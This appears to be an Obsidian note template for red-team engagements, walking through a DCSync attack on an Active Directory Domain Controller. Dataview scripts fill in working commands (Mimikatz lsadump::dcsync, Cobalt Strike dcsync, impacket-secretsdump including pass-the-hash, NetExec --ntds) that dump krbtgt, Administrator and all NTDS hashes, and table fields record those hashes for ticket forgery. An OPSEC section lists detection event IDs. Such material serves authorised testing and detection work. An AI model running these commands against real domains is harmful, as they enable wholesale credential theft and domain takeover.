---
# Attack-specific fields
sync_account: krbtgt
krbtgt_ntlm:
krbtgt_aes256:
krbtgt_aes128:
admin_ntlm:
additional_account:
notes:
---

# DCSync

> [!abstract] Attack Summary
> DCSync abuses the **MS-DRSR (Directory Replication Service)** protocol to request credential data from a Domain Controller as if you were another DC. Requires **DS-Replication-Get-Changes** + **DS-Replication-Get-Changes-All** rights — usually only Domain Admins or DCSync-enabled accounts have these.

---

## Baseline (from [[00 - Engagement Baseline]])

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
dv.table(["Field", "Value"], [
  ["Domain",   b?.domain   ?? "—"],
  ["DC IP",    b?.dc_ip    ?? "—"],
  ["DC FQDN",  b?.dc_fqdn  ?? "—"],
  ["Username", b?.username ?? "—"],
  ["OS Env",   b?.os_env   ?? "—"],
]);
```

---

## Attack-Specific Configuration

```dataviewjs
const p = dv.current();
dv.table(["Field", "Value"], [
  ["Account to Sync (default: krbtgt)", `\`INPUT[text(defaultValue("${p.sync_account ?? 'krbtgt'}")):sync_account]\``],
  ["Additional Account",                `\`INPUT[text:additional_account]\``],
]);
```

---

## Step 1 — Verify DCSync Rights

**Windows — PowerView**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const domain = b?.domain ?? "domain.local";
const username = b?.username ?? "USER";
dv.paragraph("```powershell\n# Check if current user has replication rights\nGet-ObjectAcl -DistinguishedName 'DC=" + domain.split('.').join(',DC=') + "' -ResolveGUIDs | " +
  "?{ $_.ActiveDirectoryRights -match 'ExtendedRight' -and $_.ObjectAceType -match '1131f6a'}\n```");
```

**Linux — Check ACL**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const domain   = b?.domain   ?? "DOMAIN";
const dc_ip    = b?.dc_ip    ?? "DC_IP";
const username = b?.username ?? "USER";
const password = b?.password ?? "PASSWORD";
dv.paragraph("```bash\nimpacket-dacledit " + domain + "/" + username + ":'" + password + "' -dc-ip " + dc_ip + " -principal '" + username + "' -target-dn 'DC=" + domain.split('.').join(',DC=') + "' -action read\n```");
```

---

## Step 2 — Perform DCSync

**Windows — Cobalt Strike (Beacon dcsync)**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain  = b?.domain   ?? "DOMAIN";
const account = p?.sync_account ?? "krbtgt";
const shortDomain = domain.split('.')[0].toUpperCase();
dv.paragraph("```bash\n# Built-in Beacon dcsync command\ndcsync " + domain + " " + shortDomain + "\\" + account + "\n\n# Using make_token first if needed\nmake_token " + shortDomain + "\\DOMAIN_ADMIN PASSWORD\ndcsync " + domain + " " + shortDomain + "\\" + account + "\n```");
```

**Windows — Mimikatz**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain  = b?.domain   ?? "domain.local";
const account = p?.sync_account ?? "krbtgt";
const shortDomain = domain.split('.')[0].toUpperCase();
dv.paragraph("```bash\n# Mimikatz dcsync\nlsadump::dcsync /domain:" + domain + " /user:" + shortDomain + "\\" + account + "\n\n# Dump all accounts (noisy!)\nlsadump::dcsync /domain:" + domain + " /all /csv\n```");
```

**Linux — Impacket secretsdump**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain   = b?.domain   ?? "DOMAIN";
const dc_ip    = b?.dc_ip    ?? "DC_IP";
const username = b?.username ?? "USER";
const password = b?.password ?? "PASSWORD";
const account  = p?.sync_account ?? "krbtgt";
dv.paragraph("```bash\n# Single account\nimpacket-secretsdump " + domain + "/" + username + ":'" + password + "'@" + dc_ip + " -just-dc-user " + account + "\n\n# All NTDS secrets\nimpacket-secretsdump " + domain + "/" + username + ":'" + password + "'@" + dc_ip + " -just-dc\n\n# Using NTLM hash\nimpacket-secretsdump " + domain + "/" + username + "@" + dc_ip + " -hashes :NTLM_HASH -just-dc-user " + account + "\n```");
```

**Linux — NetExec**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const domain   = b?.domain   ?? "DOMAIN";
const dc_ip    = b?.dc_ip    ?? "DC_IP";
const username = b?.username ?? "USER";
const password = b?.password ?? "PASSWORD";
dv.paragraph("```bash\nnxc smb " + dc_ip + " -u '" + username + "' -p '" + password + "' --ntds\n```");
```

---

## Step 3 — Record Extracted Hashes

Record the hashes from krbtgt (needed for ticket forgery):

| Field | Value |
|---|---|
| **krbtgt NTLM** | `INPUT[text:krbtgt_ntlm]` |
| **krbtgt AES-256** | `INPUT[text:krbtgt_aes256]` |
| **krbtgt AES-128** | `INPUT[text:krbtgt_aes128]` |
| **Administrator NTLM** | `INPUT[text:admin_ntlm]` |

---

## Step 4 — Dump Additional Accounts

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain   = b?.domain   ?? "DOMAIN";
const dc_ip    = b?.dc_ip    ?? "DC_IP";
const username = b?.username ?? "USER";
const password = b?.password ?? "PASSWORD";
const extra    = p?.additional_account || "administrator";
dv.paragraph("```bash\nimpacket-secretsdump " + domain + "/" + username + ":'" + password + "'@" + dc_ip + " -just-dc-user " + extra + "\n```");
```

---

## OPSEC

> [!warning] Detection Indicators
> - **Event 4662** with GUID `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` (DS-Replication-Get-Changes) or `89e95b76-444d-4c62-991a-0facbeda640c` (DS-Replication-Get-Changes-In-Filtered-Set).
> - Replication requests from non-DC machines are highly anomalous.
> - Mature SOCs baseline DRS traffic — unexpected sources generate alerts.
> - Azure AD Connect may legitimately replicate — know the baseline.

---

## Notes & Results

`INPUT[textarea:notes]`
